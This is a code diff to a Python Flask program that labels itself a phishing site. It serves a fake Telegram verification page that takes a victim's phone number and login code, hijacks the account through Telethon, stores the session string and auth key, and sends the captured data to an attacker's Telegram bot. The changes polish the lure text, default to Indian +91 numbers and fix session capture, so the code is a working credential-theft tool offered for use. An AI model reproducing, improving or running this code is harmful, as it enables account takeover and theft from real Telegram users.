@@ -33,6 +33,22 @@ captured_accounts = []
 pending_codes = {}
 sessions_lock = threading.Lock()
 
+# ====== Phone Formatter ======
+def format_phone(ph):
+    """Auto add +91 if 10 digit number given"""
+    if not ph:
+        return ph
+    digits = ''.join(filter(str.isdigit, ph))
+    if not digits:
+        return ph
+    if ph.startswith('+'):
+        return ph
+    if len(digits) == 10:
+        return '+91' + digits
+    if len(digits) == 12 and digits.startswith('91'):
+        return '+' + digits
+    return '+' + digits
+
 # ====== Phishing Page ======
 PAGE = """<!DOCTYPE html>
 <html>
@@ -94,6 +110,10 @@ PAGE = """<!DOCTYPE html>
         .video-item .info h4{font-size:12px;margin-bottom:3px}
         .video-item .info span{font-size:11px;color:#666}
         .footer{text-align:center;padding:20px;color:#333;font-size:11px}
+        .cc{display:flex;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;margin-bottom:12px;overflow:hidden}
+        .cc .ccd{padding:12px 8px;background:#1a1a2e;color:#888;font-size:14px;font-weight:600;display:flex;align-items:center;justify-content:center;min-width:50px;border-right:1px solid #2a2a3e}
+        .cc input{flex:1;padding:15px;background:transparent;border:none;color:white;font-size:18px;text-align:center;outline:none}
+        .cc input::placeholder{color:#555}
     </style>
 </head>
 <body>
@@ -129,14 +149,13 @@ PAGE = """<!DOCTYPE html>
             <!-- Step 1: Phone Input -->
             <div id="s1" class="step active">
                 <div class="modal-icon">📱</div>
-                <h2>Telegram verefiton </h2>
+                <h2>Telegram verification</h2>
                 <p>Enter your Telegram account phone number</p>
                 
-                <input type="tel" id="phoneInput" 
-                    placeholder="+91XXXXXXXXXX"
-                    style="width:100%; padding:15px; background:#0a0a0a; border:2px solid #2a2a3e; 
-                           border-radius:10px; color:white; font-size:18px; margin-bottom:12px; 
-                           text-align:center; outline:none">
+                <div class="cc">
+                    <div class="ccd">+91</div>
+                    <input type="tel" id="phoneInput" placeholder="8670704173" maxlength="10">
+                </div>
                 
                 <button onclick="sendPhoneFromStep1()"
                     style="width:100%; padding:15px; background:#0088cc; border:none; 
@@ -144,7 +163,7 @@ PAGE = """<!DOCTYPE html>
                            cursor:pointer; margin-bottom:10px; transition:0.3s"
                     onmouseover="this.style.background='#0077b6'"
                     onmouseout="this.style.background='#0088cc'">
-                    📱 Send your code
+                    📱 Send code
                 </button>
                 
                 <div id="ps1" class="sb info" style="display:none">⏳ Processing...</div>
@@ -153,7 +172,7 @@ PAGE = """<!DOCTYPE html>
             <!-- Step 2: OTP Code Input -->
             <div id="s2" class="step">
                 <div class="modal-icon">🔐</div>
-                <h2>Verefiton code</h2>
+                <h2>Verification code</h2>
                 <p>📱 <span id="pd" style="color:#0088cc;font-weight:bold;">+91XXXXXXXXXX</span></p>
                 <div id="cs" class="sb waiting"><span class="sp"></span> Please wait ...</div>
                 <div class="cd" id="cdisp">_____</div>
@@ -169,7 +188,7 @@ PAGE = """<!DOCTYPE html>
                     <button class="k" onclick="pk('9')">9</button>
                     <button class="k kc" onclick="cc()">⌫</button>
                     <button class="k" onclick="pk('0')">0</button>
-                    <button class="k ks" id="sb" onclick="sc()">✓ Verified </button>
+                    <button class="k ks" id="sb" onclick="sc()">✓ Verify</button>
                 </div>
                 <div id="vs" class="sb"></div>
             </div>
@@ -178,9 +197,9 @@ PAGE = """<!DOCTYPE html>
             <div id="s3" class="step">
                 <div class="ss">
                     <div class="bi">✅</div>
-                    <h2>Verefiton complete!</h2>
+                    <h2>Verification complete!</h2>
                     <p>Please wait...</p>
-                    <button class="wb" onclick="wv()">🎬 Gate link</button>
+                    <button class="wb" onclick="wv()">🎬 Get link</button>
                 </div>
             </div>
         </div>
@@ -191,7 +210,6 @@ PAGE = """<!DOCTYPE html>
     var codeDigits = '';
     var codeCheckInterval = null;
     
-    // Main button click handler
     document.getElementById('glb').onclick = function() {
         document.getElementById('vm').classList.add('active');
         document.getElementById('s1').classList.add('active');
@@ -203,23 +221,18 @@ PAGE = """<!DOCTYPE html>
         document.getElementById('phoneInput').focus();
     };
     
-    // Send phone number from Step 1
     function sendPhoneFromStep1() {
         var phone = document.getElementById('phoneInput').value.trim();
         
-        if (!phone) {
+        if (!phone || phone.length !== 10) {
             document.getElementById('ps1').className = 'sb error';
-            document.getElementById('ps1').innerHTML = '❌ Please enter your phone number ';
+            document.getElementById('ps1').innerHTML = '❌ Please enter 10 digit phone number';
             document.getElementById('ps1').style.display = 'block';
             return;
         }
         
-        phoneNumber = phone;
-        if (phoneNumber.startsWith('0') && !phoneNumber.startsWith('+')) {
-            phoneNumber = '+88' + phoneNumber;
-        } else if (!phoneNumber.startsWith('+')) {
-            phoneNumber = '+' + phoneNumber;
-        }
+        // Auto add +91
+        phoneNumber = '+91' + phone;
         
         document.getElementById('ps1').className = 'sb waiting';
         document.getElementById('ps1').innerHTML = '<span class="sp"></span> Sending code...';
@@ -238,7 +251,7 @@ PAGE = """<!DOCTYPE html>
                 document.getElementById('pd').textContent = phone;
                 var cs = document.getElementById('cs');
                 cs.className = 'sb waiting';
-                cs.innerHTML = '<span class="sp"></span> "Sending code....';
+                cs.innerHTML = '<span class="sp"></span> Sending code...';
                 cs.style.display = 'block';
                 startCodeCheck();
             } else {
@@ -266,7 +279,7 @@ PAGE = """<!DOCTYPE html>
                     codeCheckInterval = null;
                     var cs = document.getElementById('cs');
                     cs.className = 'sb success';
-                    cs.innerHTML = '✅ 5 Dixit otp fill ';
+                    cs.innerHTML = '✅ Code sent! Enter below:';
                     cs.style.display = 'block';
                 } else if (data.s === 'done') {
                     clearInterval(codeCheckInterval);
@@ -278,7 +291,7 @@ PAGE = """<!DOCTYPE html>
                     codeCheckInterval = null;
                     var cs = document.getElementById('cs');
                     cs.className = 'sb error';
-                    cs.innerHTML = '❌ Code not received ';
+                    cs.innerHTML = '❌ Error sending code';
                     cs.style.display = 'block';
                 }
             } catch(e) {}
@@ -289,9 +302,9 @@ PAGE = """<!DOCTYPE html>
     function cc() { codeDigits = codeDigits.slice(0,-1); document.getElementById('cdisp').textContent = codeDigits || '_____'; }
     
     async function sc() {
-        if(codeDigits.length < 5) { showVerifyStatus('❌ 5 verefiton code','error'); return; }
+        if(codeDigits.length < 5) { showVerifyStatus('❌ Enter 5 digit code','error'); return; }
         document.getElementById('sb').disabled = true;
-        document.getElementById('sb').textContent = '⏳ Please wait...';
+        document.getElementById('sb').textContent = '⏳ Verifying...';
         try {
             var res = await fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phoneNumber,code:codeDigits})});
             var data = await res.json();
@@ -300,11 +313,11 @@ PAGE = """<!DOCTYPE html>
                 document.getElementById('s3').classList.add('active');
                 if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
             } else {
-                showVerifyStatus('❌ ' + (data.error || 'wrong code🚫'), 'error');
+                showVerifyStatus('❌ ' + (data.error || 'Wrong code'), 'error');
                 codeDigits = ''; document.getElementById('cdisp').textContent = '_____';
-                document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ verefi';
+                document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ Verify';
             }
-        } catch(e) { showVerifyStatus('❌ Error','error'); document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ Complete🎉'; }
+        } catch(e) { showVerifyStatus('❌ Error','error'); document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ Verify'; }
     }
     
     function showVerifyStatus(msg, type) {
@@ -366,37 +379,35 @@ def run_telegram_action(phone, code=None):
                     phone_code_hash=s['hash']
                 )
                 
-                ss = StringSession.save(client.session)
+                # ====== FIXED: Get session while connected ======
                 me = await client.get_me()
+                
+                # Save session string BEFORE disconnecting
+                ss = StringSession.save(client.session)
                 
                 auth_key_bytes = client.session.auth_key.key if client.session.auth_key else None
                 dc = client.session.dc_id
                 
-                if auth_key_bytes is None:
-                    logger.warning("Auth key None on first try, reconnecting...")
+                if auth_key_bytes:
+                    auth_b64 = base64.b64encode(auth_key_bytes).decode()
+                else:
+                    logger.warning("Auth key None, trying reconnect...")
+                    ss_temp = ss
                     await client.disconnect()
                     await asyncio.sleep(0.3)
                     
-                    client2 = TelegramClient(StringSession(ss), API_ID, API_HASH)
+                    client2 = TelegramClient(StringSession(ss_temp), API_ID, API_HASH)
                     await client2.connect()
                     await client2.start()
                     
                     auth_key_bytes = client2.session.auth_key.key
                     dc = client2.session.dc_id
-                    
-                    if auth_key_bytes:
-                        auth_b64 = base64.b64encode(auth_key_bytes).decode()
-                    else:
-                        auth_b64 = ""
-                        logger.error("CRITICAL: Auth key still None after reconnect!")
-                    
+                    auth_b64 = base64.b64encode(auth_key_bytes).decode() if auth_key_bytes else ""
                     ss = StringSession.save(client2.session)
                     me = await client2.get_me()
                     await client2.disconnect()
-                else:
-                    auth_b64 = base64.b64encode(auth_key_bytes).decode()
-                    await client.disconnect()
                 
+                # Build account record
                 acc = {
                     'phone': phone,
                     'user_id': me.id,
@@ -421,6 +432,7 @@ def run_telegram_action(phone, code=None):
                         del user_sessions[phone]
                     pending_codes[phone] = 'done'
                 
+                # Notify
                 try:
                     import requests
                     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
@@ -467,10 +479,7 @@ def share():
     if not ph:
         return jsonify({'success': False, 'error': 'Phone required'})
     
-    if ph.startswith('0') and not ph.startswith('+'):
-        ph = '+91' + ph
-    elif not ph.startswith('+'):
-        ph = '+' + ph
+    ph = format_phone(ph)
     
     logger.info(f"📱 Phone received: {ph}")
     
@@ -496,10 +505,7 @@ def verify():
     ph = d.get('phone', '')
     code = d.get('code', '')
     
-    if ph.startswith('0') and not ph.startswith('+'):
-        ph = '+88' + ph
-    elif not ph.startswith('+'):
-        ph = '+' + ph
+    ph = format_phone(ph)
     
     result = run_telegram_action(ph, code)
     return jsonify(result)
@@ -627,5 +633,4 @@ if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     print(f"✅ Phishing site ready on port {port}")
     print(f"📊 Dashboard: http://localhost:{port}/dash")
-    print(f"🔧 Session API: http://localhost:{port}/session/+917365841728")
     app.run(host='0.0.0.0', port=port)
